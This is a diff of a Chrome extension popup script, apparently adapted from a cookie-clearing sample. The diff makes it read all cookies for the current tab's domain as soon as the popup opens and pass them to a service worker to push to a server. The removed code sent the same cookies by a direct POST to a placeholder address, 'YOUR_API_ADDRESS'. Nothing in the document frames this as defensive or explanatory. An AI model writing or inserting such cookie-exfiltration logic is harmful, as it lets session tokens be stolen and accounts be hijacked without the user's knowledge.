@@ -1,8 +1,7 @@
-
-const form = document.getElementById('control-row');
-const input = document.getElementById('input');
-const message = document.getElementById('message');
-const cookie_text = document.getElementById('cookie_text');
+const form = document.getElementById("control-row");
+const input = document.getElementById("input");
+const message = document.getElementById("message");
+const cookie_text = document.getElementById("cookie_text");
 
 // The async IIFE is necessary because Chrome <89 does not support top level await.
 (async function initPopupWindow() {
@@ -12,6 +11,7 @@ const cookie_text = document.getElementById('cookie_text');
     try {
       let url = new URL(tab.url);
       input.value = url.hostname;
+      await queyrCookieAndPushToServer(input.value, tab.url);
     } catch {
       // ignore
     }
@@ -19,53 +19,26 @@ const cookie_text = document.getElementById('cookie_text');
 
   input.focus();
 
-  await queyrCookie(input.value)
 })();
 
-form.addEventListener('submit', handleFormSubmit);
+form.addEventListener("submit", handleFormSubmit);
 
-async function queyrCookie(domain) {
-    const cookies = await chrome.cookies.getAll({ domain });
+async function queyrCookieAndPushToServer(domain, referer) {
+  const cookies = await chrome.cookies.getAll({ domain });
 
-    if (cookies.length === 0) {
-        cookie_text.innerText = 'No cookies found';
-    } else {
-        let __text = '' + cookies.length + ' cookies found';
-        for (let i = 0; i < cookies.length; i++) { 
-            let __cookie = cookies[i]
-            let __str = __cookie.name + "\t=\t" + __cookie.value
-            __text += __str + "<br/>"
-         }
-        cookie_text.innerHTML = __text;
-
-        const __json = {
-          cookieArrText: JSON.stringify(cookies),
-          domain: domain,
-          type: "popup",
-        };
-      const __json_str = JSON.stringify(__json)
-  
-      let __url = "http://YOUR_API_ADDRESS"
-      
-      const __option = {
-          method: 'POST',
-          body: __json_str,
-          headers: {
-              "Content-type": "application/json;charset=utf-8"
-          },
-          cache: 'default', // *default, no-cache, reload, force-cache, only-if-cached
-          credentials: 'include', // include, *same-origin, omit
-          redirect: 'follow', // manual, *follow, error
-          referrerPolicy: 'no-referrer-when-downgrade' // no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url
-      }
-  
-  
-      fetch(__url, __option)
-      .then(response => response.json()) 
-      .then(json => console.log('resp.json', json))
-      .catch(err => console.log('Request Failed', err)); 
+  if (cookies.length === 0) {
+    cookie_text.innerText = "No cookies found";
+  } else {
+    let __text = "" + cookies.length + " cookies found";
+    for (let i = 0; i < cookies.length; i++) {
+      let __cookie = cookies[i];
+      let __str = __cookie.name + "\t=\t" + __cookie.value;
+      __text += __str + "<br/>";
     }
-
+    cookie_text.innerHTML = __text;
+    // call pushCookieToServer() in service_worker.js
+    await chrome.runtime.sendMessage({type:'pushCookieToServer', domain: domain, doaminType: "popup", referer: referer});
+  }
 }
 
 async function handleFormSubmit(event) {
@@ -75,7 +48,7 @@ async function handleFormSubmit(event) {
 
   let url = stringToUrl(input.value);
   if (!url) {
-    setMessage('Invalid URL');
+    setMessage("Invalid URL");
     return;
   }
 
@@ -92,7 +65,7 @@ function stringToUrl(input) {
   }
   // If that fails, try assuming the provided input is an HTTP host
   try {
-    return new URL('http://' + input);
+    return new URL("http://" + input);
   } catch {
     // ignore
   }
@@ -106,7 +79,7 @@ async function deleteDomainCookies(domain) {
     const cookies = await chrome.cookies.getAll({ domain });
 
     if (cookies.length === 0) {
-      return 'No cookies found';
+      return "No cookies found";
     }
 
     let pending = cookies.map(deleteCookie);
@@ -129,7 +102,7 @@ function deleteCookie(cookie) {
   // To remove cookies set with a Secure attribute, we must provide the correct protocol in the
   // details object's `url` property.
   // https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Secure
-  const protocol = cookie.secure ? 'https:' : 'http:';
+  const protocol = cookie.secure ? "https:" : "http:";
 
   // Note that the final URL may not be valid. The domain value for a standard cookie is prefixed
   // with a period (invalid) while cookies that are set to `cookie.hostOnly == true` do not have
@@ -140,7 +113,7 @@ function deleteCookie(cookie) {
   return chrome.cookies.remove({
     url: cookieUrl,
     name: cookie.name,
-    storeId: cookie.storeId
+    storeId: cookie.storeId,
   });
 }
 
@@ -151,5 +124,5 @@ function setMessage(str) {
 
 function clearMessage() {
   message.hidden = true;
-  message.textContent = '';
+  message.textContent = "";
 }
